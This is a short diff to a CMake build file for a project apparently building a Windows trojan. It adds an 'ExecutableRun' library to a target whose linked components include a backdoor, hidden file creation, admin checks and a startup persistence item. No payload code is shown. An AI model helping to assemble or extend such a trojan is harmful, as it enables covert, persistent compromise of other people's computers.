@@ -1,5 +1,5 @@
 add_executable(TrojanHorseWindowsAdminServer main.cpp resource.rc)
-target_link_libraries(TrojanHorseWindowsAdminServer PUBLIC SharedConstants HiddenFileCreate BackdoorExecution AdminCheck PathToCurrentExecutable AdminStartupItem CombaseLibrary)
+target_link_libraries(TrojanHorseWindowsAdminServer PUBLIC SharedConstants HiddenFileCreate ExecutableRun BackdoorExecution AdminCheck PathToCurrentExecutable AdminStartupItem CombaseLibrary)
 
 if (CMAKE_SYSTEM_NAME STREQUAL "Windows")
     # Run executable as administrator
